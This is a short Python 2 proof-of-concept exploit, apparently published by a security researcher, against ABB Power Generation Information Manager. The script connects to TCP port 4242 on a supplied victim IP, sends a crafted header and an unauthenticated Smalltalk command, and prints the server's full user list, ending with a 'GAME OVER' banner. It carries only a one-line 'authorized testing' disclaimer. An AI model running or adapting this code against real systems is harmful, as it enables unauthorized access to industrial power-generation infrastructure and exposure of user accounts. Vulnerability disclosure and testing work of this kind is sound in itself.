#!/usr/bin/env python
#
# ABB Power Generation Information Manager Pwner
# Author: Rikard Bodforss
# Version: 0.1
#
# First 8 bytes : 12 a4 00 00 + Length (little endian) 4 bytes
# Example1: 12 a4 00 00 74 00 00 00  (data length 116 bytes)
# Example2: 12 a4 00 00 0f 01 00 00  (data length 271 bytes)
#
# Sorry for my crappy Python code...
#

import socket
import sys

def main():
		if len(sys.argv) != 2:
			print "Power Generation Pwner by Rikard Bodforss\n"
			print "Usage: %s <victim PGIM server IP>" % (sys.argv[0])
			print "\nOnly for authorized testing! Use only on your own system!"
			sys.exit(1)

		serverIP = sys.argv[1]
		port = 4242 # Default port for PGIM 
		# Userlist command is 116 bytes 0x74 bytes long:
		payload1 = "\x12\xa4\x00\x00\x74\x00\x00\x00" 
		# Userlist command:
		payload2 = 'SMALLTALK | uman | uman := PersistentObjects getOrCreate:\'USERMAN\' class: PlantConnectUserManager. uman listAllUsers'
		print "Power Generation Pwner is getting ready for some Pwnage!\n"
		print "[+] Pwning "+serverIP+"..."
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((serverIP, port))
		s.send(payload1)
		s.send(payload2)
		# We could read the lenght value in the first eight bytes
		# and be more precise in the handling of the result...
		# This is quick and dirty. Just yank 4096 bytes off the buffer
		# and run with it. Room for improvement, but this is just
		# a crude PoC with no error handling.
		result = s.recv(4096) 
		result = result.replace("\r","\n")
		if len(result)>8:
				print result[8:]
				print "**** GAME OVER! Play again? ****"
		sys.exit(0)


if __name__ == "__main__":
		main()
